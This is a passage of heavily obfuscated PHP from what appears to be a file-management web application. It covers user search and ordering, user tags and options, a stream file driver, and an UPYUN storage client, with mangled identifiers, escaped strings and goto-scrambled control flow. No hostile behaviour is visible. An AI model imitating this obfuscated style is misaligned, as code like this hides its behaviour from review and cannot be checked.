"\x4c\105\x46\124\x20\112\117\111\x4e\x20{$this->tablePrefix}\165\x73\x65\162\x5f\147\x72\157\x75\x70\40\165\x73\145\x72\137\x67\x72\157\x75\x70\x20\x6f\156\40\x75\163\145\x72\56\x75\163\x65\x72\111\x44\x20\75\40\165\x73\145\162\x5f\x67\162\x6f\x75\160\56\165\163\x65\x72\111\104"; $cæ®¾øè¿è = Input::get($fÁÊ©Ëš[433], null, $fÁÊ©Ëš[33]) ? $fÁÊ©Ëš[33] : $fÁÊ©Ëš[2131]; } if (isset($F…ÒãªÙ³[$fÁÊ©Ëš[697]])) { $dî²»‡Ó””[$fÁÊ©Ëš[2132]] = $F…ÒãªÙ³[$fÁÊ©Ëš[697]]; } $B¿„´¯è‚ = $this->_makeOrder($cæ®¾øè¿è)->field($fÁÊ©Ëš[2133])->where($dî²»‡Ó””)->join($fÉ¯Ô¹ÛŠ¿)->selectPage(50); goto eµºä¬›´‚; eµºä¬›´‚: $this->_listDataApply($B¿„´¯è‚[$fÁÊ©Ëš[366]]); return $B¿„´¯è‚; goto e‚î»“‰Ê¾; e‚î»“‰Ê¾: } private function _makeOrder($AÈ…³šéŞó = '') { goto dÎ¼ª ¡±˜; dŒ¹Á¾î‘Ş: $aäÍ¾î³‹Ì = Input::get($fÚŞæ ¶ŞÕ[433], $fÚŞæ ¶ŞÕ[7], $fÚŞæ ¶ŞÕ[1500], $e£à‚¼¥ß); $Eç¿æŸîç = Input::get($fÚŞæ ¶ŞÕ[434], $fÚŞæ ¶ŞÕ[7], $fÚŞæ ¶ŞÕ[1753], array($fÚŞæ ¶ŞÕ[1753], $fÚŞæ ¶ŞÕ[428])); $Eç¿æŸîç = $b±”Ú‡‡Í™[$Eç¿æŸîç]; goto EÅÉîÍßÚœ; dÎ¼ª ¡±˜: $fÚŞæ ¶ŞÕ =& $_SERVER[Ïº«‚ßèÔˆø]; $e£à‚¼¥ß = array($fÚŞæ ¶ŞÕ[1508], $fÚŞæ ¶ŞÕ[28], $fÚŞæ ¶ŞÕ[1657], $fÚŞæ ¶ŞÕ[1629], $fÚŞæ ¶ŞÕ[193]); $b±”Ú‡‡Í™ = array($fÚŞæ ¶ŞÕ[426] => $fÚŞæ ¶ŞÕ[427], $fÚŞæ ¶ŞÕ[428] => $fÚŞæ ¶ŞÕ[429]); goto dŒ¹Á¾î‘Ş; EÅÉîÍßÚœ: $AÈ…³šéŞó = $AÈ…³šéŞó . "\x75\163\x65\x72\56{$aäÍ¾î³‹Ì}\x20{$Eç¿æŸîç}\x2c\40\x75\163\145\162\56\165\163\145\162\111\104\40\141\163\143"; return $this->alias($fÚŞæ ¶ŞÕ[1875])->order($AÈ…³šéŞó); goto A‚Ëã“ìĞğ; A‚Ëã“ìĞğ: } public function listSearch($c„Æ¨Û˜—İ) { goto b‹Åï÷ß˜‰; F£Î…ä…Œ: $this->_filterByGroup($e‰Ê‘Ñõ¿ˆ, $aŠîŒø¯ê); return $e‰Ê‘Ñõ¿ˆ; goto cŠÕ¤Ú‘¿; b‹Åï÷ß˜‰: $fË–’šÄ¸² =& $_SERVER[Ïº«‚ßèÔˆø]; $EáÕ¯ì¢Å” = $c„Æ¨Û˜—İ[$fË–’šÄ¸²[1754]]; $aŠîŒø¯ê = isset($c„Æ¨Û˜—İ[$fË–’šÄ¸²[1755]]) ? $c„Æ¨Û˜—İ[$fË–’šÄ¸²[1755]] : !1; goto cÉŠëÎÏ‚¾; B„Ôµš±ô›: $e‰Ê‘Ñõ¿ˆ = $this->_makeOrder()->where($EÒù¬ä÷¥ù)->selectPage(20); if (!$e‰Ê‘Ñõ¿ˆ || count($e‰Ê‘Ñõ¿ˆ[$fË–’šÄ¸²[366]]) < 5 && Input::check($EáÕ¯ì¢Å”, $fË–’šÄ¸²[315])) { $A³»–áÓ×Ê = $this->_searchFromMeta($fË–’šÄ¸²[441], $EáÕ¯ì¢Å”, 10); $d¬Ë¨‚½¨ = $this->_searchFromMeta($fË–’šÄ¸²[442], $EáÕ¯ì¢Å”, 10); $A—§à ïàÇ = array_merge($A³»–áÓ×Ê, $d¬Ë¨‚½¨, $e‰Ê‘Ñõ¿ˆ[$fË–’šÄ¸²[366]]); $e‰Ê‘Ñõ¿ˆ[$fË–’šÄ¸²[366]] = array_unique_by_key($A—§à ïàÇ, $fË–’šÄ¸²[1508]); $e‰Ê‘Ñõ¿ˆ[$fË–’šÄ¸²[363]][$fË–’šÄ¸²[364]] = count($e‰Ê‘Ñõ¿ˆ[$fË–’šÄ¸²[366]]); $e‰Ê‘Ñõ¿ˆ[$fË–’šÄ¸²[363]][$fË–’šÄ¸²[365]] = ceil($e‰Ê‘Ñõ¿ˆ[$fË–’šÄ¸²[363]][$fË–’šÄ¸²[364]] / $e‰Ê‘Ñõ¿ˆ[$fË–’šÄ¸²[363]][$fË–’šÄ¸²[360]]); } $this->_listDataApply($e‰Ê‘Ñõ¿ˆ[$fË–’šÄ¸²[366]]); goto F£Î…ä…Œ; F¹ŠÆ›ŠÔ»: if (!$EáÕ¯ì¢Å”) { $EÒù¬ä÷¥ù = array(); } if (isset($c„Æ¨Û˜—İ[$fË–’šÄ¸²[697]])) { $EÒù¬ä÷¥ù[$fË–’šÄ¸²[697]] = $c„Æ¨Û˜—İ[$fË–’šÄ¸²[697]]; } $EÒù¬ä÷¥ù = $this->parseWhereLike($EÒù¬ä÷¥ù); goto B„Ôµš±ô›; cÉŠëÎÏ‚¾: $EáÕ¯ì¢Å” = str_replace($fË–’šÄ¸²[1756], $fË–’šÄ¸²[1757], trim($EáÕ¯ì¢Å”)); $EÒù¬ä÷¥ù = array($fË–’šÄ¸²[28] => array($fË–’šÄ¸²[379], "\x25{$EáÕ¯ì¢Å”}\45"), $fË–’šÄ¸²[302] => array($fË–’šÄ¸²[379], "{$EáÕ¯ì¢Å”}\x25"), $fË–’šÄ¸²[1935] => array($fË–’šÄ¸²[379], "{$EáÕ¯ì¢Å”}\45"), $fË–’šÄ¸²[941] => $fË–’šÄ¸²[1758]); if (Input::check($EáÕ¯ì¢Å”, $fË–’šÄ¸²[308])) { $EÒù¬ä÷¥ù[$fË–’šÄ¸²[1508]] = array($fË–’šÄ¸²[379], "{$EáÕ¯ì¢Å”}\45"); $EÒù¬ä÷¥ù[$fË–’šÄ¸²[2114]] = array($fË–’šÄ¸²[379], "{$EáÕ¯ì¢Å”}\x25"); } goto F¹ŠÆ›ŠÔ»; cŠÕ¤Ú‘¿: } private function _filterByGroup(&$B¯ß×¶óÊà, $fÃã»¿õè) { $bÔÂ–÷îé =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$fÃã»¿õè) { return $B¯ß×¶óÊà; } foreach ($B¯ß×¶óÊà[$bÔÂ–÷îé[366]] as $BÎŒºÆÈÚÅ => &$bŠÙĞî) { $c´ïéç£î™ = array_to_keyvalue($bŠÙĞî[$bÔÂ–÷îé[1845]], $bÔÂ–÷îé[33], $bÔÂ–÷îé[1671]); if (!in_array($fÃã»¿õè, $c´ïéç£î™)) { unset($B¯ß×¶óÊà[$bÔÂ–÷îé[366]][$BÎŒºÆÈÚÅ]); } } unset($bŠÙĞî); $B¯ß×¶óÊà[$bÔÂ–÷îé[366]] = array_values($B¯ß×¶óÊà[$bÔÂ–÷îé[366]]); $B¯ß×¶óÊà[$bÔÂ–÷îé[363]] = array($bÔÂ–÷îé[1907] => count($B¯ß×¶óÊà[$bÔÂ–÷îé[366]]), $bÔÂ–÷îé[1905] => $B¯ß×¶óÊà[$bÔÂ–÷îé[363]][$bÔÂ–÷îé[360]], $bÔÂ–÷îé[1904] => 1, $bÔÂ–÷îé[1906] => 1); } private function _searchFromMeta($EÚ¡†—¾ùØ, $aîŞ…£ñ•, $b—©‘•¼Ç¯) { goto E…Ş‹é†…´; b‡”Äã¥Á˜: return $AîÖÖ¨” Ä; goto f§°–é’£§; e§’•˜Ù¾Ø: $dñï‹ŸåÖ = array_to_keyvalue($dñï‹ŸåÖ, $DÈÔ·™ä[33], $DÈÔ·™ä[1508]); $AîÖÖ¨” Ä = $this->where(array($DÈÔ·™ä[1500] => array($DÈÔ·™ä[7], $dñï‹ŸåÖ)))->select(); if (!$AîÖÖ¨” Ä) { return array(); } goto b‡”Äã¥Á˜; B“¦šÔ¡Š–: $d¶¾ˆÇíºğ = $this->parseWhereLike($d¶¾ˆÇíºğ); $dñï‹ŸåÖ = Model($DÈÔ·™ä[2134])->where($d¶¾ˆÇíºğ)->limit($b—©‘•¼Ç¯)->select(); if (!$dñï‹ŸåÖ) { return array(); } goto e§’•˜Ù¾Ø; E…Ş‹é†…´: $DÈÔ·™ä =& $_SERVER[Ïº«‚ßèÔˆø]; $aîŞ…£ñ• = strtolower($aîŞ…£ñ•); $d¶¾ˆÇíºğ = array($DÈÔ·™ä[93] => $EÚ¡†—¾ùØ, $DÈÔ·™ä[371] => array($DÈÔ·™ä[379], "\45{$aîŞ…£ñ•}\x25")); goto B“¦šÔ¡Š–; f§°–é’£§: } private function _listDataApplyItem($cİ›ŒäËİó) { $cííÀ®æˆÂ = array($cİ›ŒäËİó); $this->_listDataApply($cííÀ®æˆÂ); return $cííÀ®æˆÂ[0]; } private function _listDataApply(&$EŠùÓÔ¿Ÿ) { goto cßî£Àë‚; c¨ìÍì§î: $bË¾ËÎªêğ = array_to_keyvalue($EŠùÓÔ¿Ÿ, $AçòÀ§öÂ[33], $AçòÀ§öÂ[1508]); $this->_listAppendGroup($EŠùÓÔ¿Ÿ, $bË¾ËÎªêğ); $this->_listAppendMeta($EŠùÓÔ¿Ÿ, $bË¾ËÎªêğ); goto E³‡…¥ëà; cßî£Àë‚: $AçòÀ§öÂ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$EŠùÓÔ¿Ÿ) { return; } array_remove_key($EŠùÓÔ¿Ÿ, $AçòÀ§öÂ[833]); goto c¨ìÍì§î; E³‡…¥ëà: $this->_listAppendSourceRoot($EŠùÓÔ¿Ÿ, $bË¾ËÎªêğ); goto BÚçÌÕá¯; BÚçÌÕá¯: } private function _listAppendSourceRoot(&$Cá¼šçêò, $føÆˆÚá¨£) { goto BÙğÇì°à; d©²°ˆ¥¹‘: $EİÔİ›ïØ = Model($E—ïâ²œ×[782])->order($E—ïâ²œ×[1765])->field($DôÄŞ‹Ñ»º)->where($DÁ”Û»Ò·š)->select(); $EİÔİ›ïØ = array_to_keyvalue($EİÔİ›ïØ, $E—ïâ²œ×[482]); $EİÔİ›ïØ = array_remove_key($EİÔİ›ïØ, $E—ïâ²œ×[482]); goto e—ÂÀØ—ğà; e—ÂÀØ—ğà: foreach ($Cá¼šçêò as &$d¡‡†‰‘—) { $d¡‡†‰‘—[$E—ïâ²œ×[85]] = $EİÔİ›ïØ[$d¡‡†‰‘—[$E—ïâ²œ×[1508]]] ? $EİÔİ›ïØ[$d¡‡†‰‘—[$E—ïâ²œ×[1508]]] : array(); } unset($d¡‡†‰‘—); goto eÈ„Œ¬îÔ; BÙğÇì°à: $E—ïâ²œ× =& $_SERVER[Ïº«‚ßèÔˆø]; $DÁ”Û»Ò·š = array($E—ïâ²œ×[476] => 0, $E—ïâ²œ×[402] => SourceModel::TYPE_USER, $E—ïâ²œ×[482] => array($E—ïâ²œ×[7], $føÆˆÚá¨£)); $DôÄŞ‹Ñ»º = $E—ïâ²œ×[1764]; goto d©²°ˆ¥¹‘; eÈ„Œ¬îÔ: } private function _listAppendGroup(&$b›¡Á¤Üçµ, $Bå„´ÛÙ“) { goto C¤ŞËèÙ«®; Dµœ¢ß¨äô: foreach ($b›¡Á¤Üçµ as &$DÁ´øù‘¤„) { $DÁ´øù‘¤„[$bšõÆĞØ£[1845]] = array(); if (isset($d÷òÚğªËŸ[$DÁ´øù‘¤„[$bšõÆĞØ£[1508]]])) { $DÁ´øù‘¤„[$bšõÆĞØ£[1845]] = $d÷òÚğªËŸ[$DÁ´øù‘¤„[$bšõÆĞØ£[1508]]]; } } unset($DÁ´øù‘¤„); goto cÓÏ³¯¶¥—; A‰ÉßÅ…¶Ï: $fä¿Œ›Ÿø¶ = array($bšõÆĞØ£[1671] => array($bšõÆĞØ£[7], $c¶ø×§¨­)); $cääÜáÉ  = Model($bšõÆĞØ£[1843])->field($bšõÆĞØ£[2135])->where($fä¿Œ›Ÿø¶)->select(); $cääÜáÉ  = array_to_keyvalue($cääÜáÉ , $bšõÆĞØ£[1671]); goto d½‡ÅŞÒ¥â; BæÎÆª­Õé: $c¶ø×§¨­ = array_to_keyvalue($d÷òÚğªËŸ, $bšõÆĞØ£[33], $bšõÆĞØ£[1671]); $c¶ø×§¨­ = array_remove_value(array_unique($c¶ø×§¨­), $bšõÆĞØ£[495]); if (!$c¶ø×§¨­ || !$d÷òÚğªËŸ) { return; } goto A‰ÉßÅ…¶Ï; C¤ŞËèÙ«®: $bšõÆĞØ£ =& $_SERVER[Ïº«‚ßèÔˆø]; $fä¿Œ›Ÿø¶ = array($bšõÆĞØ£[1508] => array($bšõÆĞØ£[7], $Bå„´ÛÙ“)); $d÷òÚğªËŸ = Model($bšõÆĞØ£[1752])->where($fä¿Œ›Ÿø¶)->select(); goto BæÎÆª­Õé; d½‡ÅŞÒ¥â: $d÷òÚğªËŸ = array_to_keyvalue_group($d÷òÚğªËŸ, $bšõÆĞØ£[1508]); foreach ($d÷òÚğªËŸ as &$dª—…ßÓÒ³) { $A—ÁÊ¹À•à = array(); foreach ($dª—…ßÓÒ³ as $BŸ¶Ó¡©Ó) { if (!$BŸ¶Ó¡©Ó[$bšõÆĞØ£[1766]]) { continue; } $eò÷­î‹ìÇ = Model($bšõÆĞØ£[1838])->listData($BŸ¶Ó¡©Ó[$bšõÆĞØ£[1766]]); $A—ÁÊ¹À•à[] = array($bšõÆĞØ£[1671] => $BŸ¶Ó¡©Ó[$bšõÆĞØ£[1671]], $bšõÆĞØ£[2136] => $cääÜáÉ [$BŸ¶Ó¡©Ó[$bšõÆĞØ£[1671]]][$bšõÆĞØ£[28]], $bšõÆĞØ£[485] => $cääÜáÉ [$BŸ¶Ó¡©Ó[$bšõÆĞØ£[1671]]][$bšõÆĞØ£[485]], $bšõÆĞØ£[404] => $eò÷­î‹ìÇ); } $dª—…ßÓÒ³ = $A—ÁÊ¹À•à; } unset($dª—…ßÓÒ³); goto Dµœ¢ß¨äô; cÓÏ³¯¶¥—: } private function _listAppendMeta(&$BŒØçÉ’»ƒ, $a³¯å´Âô) { goto D¿Ñï™³°±; b‰©Ïë‰„¨: $dªëÇçî… = array($E‹÷Â«§Ùœ[1508] => array($E‹÷Â«§Ùœ[7], $a³¯å´Âô)); $aŠ§é¾ÒÄá = Model($E‹÷Â«§Ùœ[2113])->where($dªëÇçî…)->select(); $aŠ§é¾ÒÄá = array_to_keyvalue_group($aŠ§é¾ÒÄá, $E‹÷Â«§Ùœ[1508]); goto BŒÒ³‘¤ˆì; D¿Ñï™³°±: $E‹÷Â«§Ùœ =& $_SERVER[Ïº«‚ßèÔˆø]; $Fç×›®éæÚ = UserJobModel::JOB_KEY; $DÃ¯Ğ à­± = array($E‹÷Â«§Ùœ[2115]); goto b‰©Ïë‰„¨; A‡Õ­§Ë¡ª: foreach ($BŒØçÉ’»ƒ as &$b¡‰¨–£¼¨) { $a†¡§Ø”éÚ = array(); if (isset($aŠ§é¾ÒÄá[$b¡‰¨–£¼¨[$E‹÷Â«§Ùœ[1508]]])) { $a†¡§Ø”éÚ = $aŠ§é¾ÒÄá[$b¡‰¨–£¼¨[$E‹÷Â«§Ùœ[1508]]]; } $b¡‰¨–£¼¨[$E‹÷Â«§Ùœ[2138]] = array(); if (isset($a†¡§Ø”éÚ[$Fç×›®éæÚ])) { $b¡‰¨–£¼¨[$E‹÷Â«§Ùœ[2138]] = $Dß‚Ç¾ĞÆ->getUserJobInfo($a†¡§Ø”éÚ[$Fç×›®éæÚ]); } } unset($b¡‰¨–£¼¨); goto F’ì¯ÇÄ–; BŒÒ³‘¤ˆì: foreach ($aŠ§é¾ÒÄá as &$F¾¼÷…ÎÍ) { $d‘Ÿºµ“ ´ = array(); foreach ($F¾¼÷…ÎÍ as $B¹¶¶ß÷œæ) { if (!in_array($B¹¶¶ß÷œæ[$E‹÷Â«§Ùœ[93]], $DÃ¯Ğ à­±)) { $d‘Ÿºµ“ ´[$B¹¶¶ß÷œæ[$E‹÷Â«§Ùœ[93]]] = $B¹¶¶ß÷œæ[$E‹÷Â«§Ùœ[371]]; } } $F¾¼÷…ÎÍ = $d‘Ÿºµ“ ´; } unset($F¾¼÷…ÎÍ); $Dß‚Ç¾ĞÆ = Model($E‹÷Â«§Ùœ[2137]); goto A‡Õ­§Ë¡ª; F’ì¯ÇÄ–: } protected function groupUserAll($dÉÉ‰À¿ß‚) { $f…Ğ¶³ºë =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$dÉÉ‰À¿ß‚) { return !1; } $e“ŒÕ– Ò· = Model($f…Ğ¶³ºë[1752])->field($f…Ğ¶³ºë[1508])->where(array($f…Ğ¶³ºë[1671] => array($f…Ğ¶³ºë[7], $dÉÉ‰À¿ß‚)))->select(); $e“ŒÕ– Ò· = array_to_keyvalue($e“ŒÕ– Ò·, $f…Ğ¶³ºë[33], $f…Ğ¶³ºë[1508]); return array_unique($e“ŒÕ– Ò·); } public function userSearch($bâ¹Ó¤Œ²Ê, $AÖ‘Á°œÕ« = "\52") { return Model($_SERVER[Ïº«‚ßèÔˆø][505])->where($bâ¹Ó¤Œ²Ê)->field($AÖ‘Á°œÕ«)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\x5f\x6f\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($eÀàŠ‡äæ) { $AêŠÍÈÎÎ‰ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!defined($AêŠÍÈÎÎ‰[452])) { define($AêŠÍÈÎÎ‰[452], 0); } return "\x55\163\145\x72\x4f\x70\x74\x69\157\x6e\x5f{$eÀàŠ‡äæ}\x5f" . USER_ID; } protected function filterWhere($fï‡ÈšàšÂ) { $dº±é„ŒŒ… =& $_SERVER[Ïº«‚ßèÔˆø]; if (!defined($dº±é„ŒŒ…[452])) { define($dº±é„ŒŒ…[452], 0); } $fï‡ÈšàšÂ[$dº±é„ŒŒ…[1508]] = USER_ID; return $fï‡ÈšàšÂ; } public function cacheRemoveUser($FÖªô„¼Ğ¶, $Eˆß‰˜§õ†) { return Cache::remove("\125\163\x65\162\117\160\x74\x69\x6f\x6e\137{$FÖªô„¼Ğ¶}\137" . $Eˆß‰˜§õ†); } protected function optionDefault($Eµ¸“¶¤¾ã = '') { $fÕĞ‚Á› =& $_SERVER[Ïº«‚ßèÔˆø]; if ($Eµ¸“¶¤¾ã == $fÕĞ‚Á›[33]) { return $GLOBALS[$fÕĞ‚Á›[6]][$fÕĞ‚Á›[2139]]; } if ($Eµ¸“¶¤¾ã == $fÕĞ‚Á›[2140]) { return $GLOBALS[$fÕĞ‚Á›[6]][$fÕĞ‚Á›[2141]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\164\141\147\x4c\151\x73\x74"; public $modelType = "\x55\x73\x65\162\117\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\x65", "\x73\164\x79\154\145", "\x73\x6f\x72\164"); public function listData($Bè»¨µ“¾» = false, $aÊ™½‘™öŒ = "\163\x6f\162\x74", $f‹ÌºéˆÂ· = false) { return parent::listData($Bè»¨µ“¾», $aÊ™½‘™öŒ, $f‹ÌºéˆÂ·); } public function remove($dïŒòçñŸ‰) { return parent::remove($dïŒòçñŸ‰); } public function add($Dæ¢Ñ¡¦­±, $AÄ‘åŸ¥é = "\x6c\x61\x62\145\x6c\x2d\x67\162\145\x79\55\156\x6f\162\x6d\x61\154") { $CŠ¨ôîìã =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->findByName($Dæ¢Ñ¡¦­±)) { return !1; } $fÜà¨©·ùÅ = array($CŠ¨ôîìã[411] => $Dæ¢Ñ¡¦­±, $CŠ¨ôîìã[462] => $AÄ‘åŸ¥é, $CŠ¨ôîìã[1675] => $this->getSort($CŠ¨ôîìã[255]) + 1); return parent::insert($fÜà¨©·ùÅ); } public function update($f‰Ÿğ„Œ÷, $EÌ‡ÎÒáÕ) { $dˆšÇî”ËÃ =& $_SERVER[Ïº«‚ßèÔˆø]; $B·ó©˜Å = $this->listData($f‰Ÿğ„Œ÷); $E«éö‡öÚ = $this->findByName($EÌ‡ÎÒáÕ[$dˆšÇî”ËÃ[28]]); if (!$B·ó©˜Å || $E«éö‡öÚ && $E«éö‡öÚ[$dˆšÇî”ËÃ[392]] != $B·ó©˜Å[$dˆšÇî”ËÃ[392]]) { return !1; } return parent::update($f‰Ÿğ„Œ÷, $EÌ‡ÎÒáÕ); } public function moveTop($FàöÉ¼Œ¹÷) { $bÀÌÂ¯÷Ì¢ =& $_SERVER[Ïº«‚ßèÔˆø]; $FÒ–†Ùƒ±Ê = parent::listData(); $c×‹Ì’Ò‘ = $this->getSort($bÀÌÂ¯÷Ì¢[254]); foreach ($FÒ–†Ùƒ±Ê as &$B²é˜Ş†š) { if ($B²é˜Ş†š[$bÀÌÂ¯÷Ì¢[392]] == $FàöÉ¼Œ¹÷) { $B²é˜Ş†š[$bÀÌÂ¯÷Ì¢[1694]] = $c×‹Ì’Ò‘; continue; } $B²é˜Ş†š[$bÀÌÂ¯÷Ì¢[1694]] += 1; } unset($B²é˜Ş†š); return parent::resetData($FÒ–†Ùƒ±Ê); } public function moveBottom($D×ôäõÈ·à) { $CŠäµâóÏ‚ =& $_SERVER[Ïº«‚ßèÔˆø]; $BÄµ¤Ó¬Ö… = $this->getSort($CŠäµâóÏ‚[255]) + 1; return parent::update($D×ôäõÈ·à, array($CŠäµâóÏ‚[1694] => $BÄµ¤Ó¬Ö…)); } public function resetSort($eóÓ×æ¬©) { goto BÛØõÄÓ’; bâÈ×œÏÓˆ: for ($bê±šİ‚–å = 0; $bê±šİ‚–å < count($eóÓ×æ¬©); $bê±šİ‚–å++) { $F¡í÷š–Ş‘[$eóÓ×æ¬©[$bê±šİ‚–å] . $e×²†šïËÒ[33]] = $bê±šİ‚–å + 1; } $fº¬•º£‘Ş = parent::listData(); foreach ($fº¬•º£‘Ş as &$D¬¶¢°±Ï‚) { $eÛÔ ‹Àó× = $F¡í÷š–Ş‘[$D¬¶¢°±Ï‚[$e×²†šïËÒ[392]]]; $D¬¶¢°±Ï‚[$e×²†šïËÒ[1694]] = $eÛÔ ‹Àó× ? $eÛÔ ‹Àó× : $D¬¶¢°±Ï‚[$e×²†šïËÒ[1694]]; } goto D´’’„òè; D´’’„òè: unset($D¬¶¢°±Ï‚); return parent::resetData($fº¬•º£‘Ş); goto c»Éß­¥Óˆ; BÛØõÄÓ’: $e×²†šïËÒ =& $_SERVER[Ïº«‚ßèÔˆø]; $F¡í÷š–Ş‘ = array(); $eóÓ×æ¬© = is_array($eóÓ×æ¬©) ? $eóÓ×æ¬© : array(); goto bâÈ×œÏÓˆ; c»Éß­¥Óˆ: } private function getSort($dµÜƒÂÂë÷) { $aÅ”ª·‘İØ =& $_SERVER[Ïº«‚ßèÔˆø]; $FŒµéÎòí = parent::listData(); $dí˜§³øÜõ = array_to_keyvalue($FŒµéÎòí, $aÅ”ª·‘İØ[33], $aÅ”ª·‘İØ[1694]); if (!$dí˜§³øÜõ) { $dí˜§³øÜõ = array(0); } $B£®ÂêÆ¤˜ = $dµÜƒÂÂë÷ == $aÅ”ª·‘İØ[255] ? max($dí˜§³øÜõ) : min($dí˜§³øÜõ); return intval($B£®ÂêÆ¤˜); } } goto F‹—ñ‰ğØ…; EÏÔ‰…ÌÇÊ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Cë·Œ¾óæ, $FŞñå™åä÷ = 0) { parent::__construct(); $this->source = $Cë·Œ¾óæ; $this->sourceSize = $FŞñå™åä÷; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($aáŠÎŠ©‹è = false) { return $this->sourceSize; } public function getContent($B§Ã–öÙÖ“ = false) { return $this->fileSubstr($B§Ã–öÙÖ“, 0, $this->sourceSize); } public function fileSubstr($FçÄíÔ²«¶ = false, $D˜Ù¦ğîÑ = 0, $dø—Û‹ê• = 0) { if (!$dø—Û‹ê•) { $dø—Û‹ê• = $this->sourceSize; } $DÎçšØÆÀŠ = $this->sourceSize - $D˜Ù¦ğîÑ; if ($dø—Û‹ê• >= $DÎçšØÆÀŠ) { $dø—Û‹ê• = $DÎçšØÆÀŠ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $D˜Ù¦ğîÑ, $dø—Û‹ê•); } if ($this->sourceType == self::TYPE_FILE) { if ($dø—Û‹ê• <= 0) { return $_SERVER[Ïº«‚ßèÔˆø][33]; } $FĞÃÁ¨°Ÿ‹ = ftell($this->source); fseek_64($this->source, $FĞÃÁ¨°Ÿ‹ + $D˜Ù¦ğîÑ); $D¾®Î ®å = @fread($this->source, $dø—Û‹ê•); fseek_64($this->source, $FĞÃÁ¨°Ÿ‹); return $D¾®Î ®å; } } public function hashMd5($B˜œŒóˆˆ = false) { return md5($this->getContent()); } public static function hash($FÚßàç­, $ağ¢­ ÷³ = 0) { $dŒ„ùöóœŒ = new PathDriverStream($FÚßàç­, $ağ¢­ ÷³); return $dŒ„ùöóœŒ->hashSimple($FÚßàç­); } public static function md5($AğŠÒ‰ öŠ, $c¸¬¤’øÕ¡ = 0) { $B„öÊ¨ƒê = new PathDriverStream($AğŠÒ‰ öŠ, $c¸¬¤’øÕ¡); return $B„öÊ¨ƒê->hashMd5($AğŠÒ‰ öŠ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\57\x2f\166\60\56\x61\160\x69\56\x75\160\171\165\x6e\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($B©Ÿ•ÀÄİ«) { parent::__construct(); $this->_init($B©Ÿ•ÀÄİ«); } public function _init($aæïìöª÷Ò) { $BœÕÔ©ÙÉØ =& $_SERVER[Ïº«‚ßèÔˆø]; foreach ($aæïìöª÷Ò as $f­¯ìÊ®šÓ => $AÊ¼±˜îâ—) { if (isset($this->{$f­¯ìÊ®šÓ})) { $this->{$f­¯ìÊ®šÓ} = $AÊ¼±˜îâ—; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($BœÕÔ©ÙÉØ[1311] . LNG($BœÕÔ©ÙÉØ[1243])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($E©âÜ± Ø¦, $BœÏ÷®Ï‡Ñ = "\x47\105\x54") { $E¨Çö˜«„æ =& $_SERVER[Ïº«‚ßèÔˆø]; $f˜œ—ãç‚ = gmdate($E¨Çö˜«„æ[1277]); $C¾ª·÷œï‡ = base64_encode(hash_hmac($E¨Çö˜«„æ[1312], "{$BœÏ÷®Ï‡Ñ}\46{$E©âÜ± Ø¦}\x26{$f˜œ—ãç‚}", md5("{$this->userpass}"), !0)); $cçèÊ—ƒæ¸ = array("\101\x75\x74\150\x6f\162\151\172\x61\164\151\157\156\x3a\x55\120\x59\x55\116\40{$this->username}\x3a{$C¾ª·÷œï‡}", "\104\x61\x74\145\x3a{$f˜œ—ãç‚}"); return $cçèÊ—ƒæ¸; } public function ussRequest($DÚ¢ÉµâšÏ, $C¥ÆÖç‰ƒ = "\x47\x45\124", $EŞŞÓ÷Ÿ” = false, $cªƒê¢ˆ¦¼ = false, $B¡Ü”Üğ = false) { goto AÌ®™×£Õ; AÌ®™×£Õ: $AÚ­Ô¯Åâ =& $_SERVER[Ïº«‚ßèÔˆø]; $DÚ¢ÉµâšÏ = trim($DÚ¢ÉµâšÏ, $AÚ­Ô¯Åâ[8]); $b Â”–ƒ÷ = "\x2f{$this->bucket}\x2f{$DÚ¢ÉµâšÏ}"; goto Eø‹ÜÜ–œè; Eø‹ÜÜ–œè: $bÓà¿´Õ¬‰ = $this->ussHeaders($b Â”–ƒ÷, $C¥ÆÖç‰ƒ); if ($cªƒê¢ˆ¦¼) { $bÓà¿´Õ¬‰ = array_merge($bÓà¿´Õ¬‰, $cªƒê¢ˆ¦¼); } $a„’ÌÊù®à = url_request($this->endpoint . $b Â”–ƒ÷, $C¥ÆÖç‰ƒ, $EŞŞÓ÷Ÿ”, $bÓà¿´Õ¬‰, $B¡Ü”Üğ); goto cÕ¹Í‰ğ…³; cÕ¹Í‰ğ…³: if (!$a„’ÌÊù®à) { return array($AÚ­Ô¯Åâ[1069] => !1, $AÚ­Ô¯Åâ[1071] => $AÚ­Ô¯Åâ[1313]); } if (strtolower($C¥ÆÖç‰ƒ) == $AÚ­Ô¯Åâ[190] || in_array($a„’ÌÊù®à[$AÚ­Ô¯Åâ[1069]], array($AÚ­Ô¯Åâ[1170], $AÚ­Ô¯Åâ[1314]))) { $EŞŞÓ÷Ÿ” = $a„’ÌÊù®à[$AÚ­Ô¯Åâ[1315]]; } else { $EŞŞÓ÷Ÿ” = json_decode($a„’ÌÊù®à[$AÚ­Ô¯Åâ[1071]], !0); if (!$EŞŞÓ÷Ÿ”) { $EŞŞÓ÷Ÿ” = $a„’ÌÊù®à[$AÚ­Ô¯Åâ[1071]]; } else { if (!$a„’ÌÊù®à[$AÚ­Ô¯Åâ[697]] && isset($EŞŞÓ÷Ÿ”[$AÚ­Ô¯Åâ[1316]])) { $EŞŞÓ÷Ÿ” = 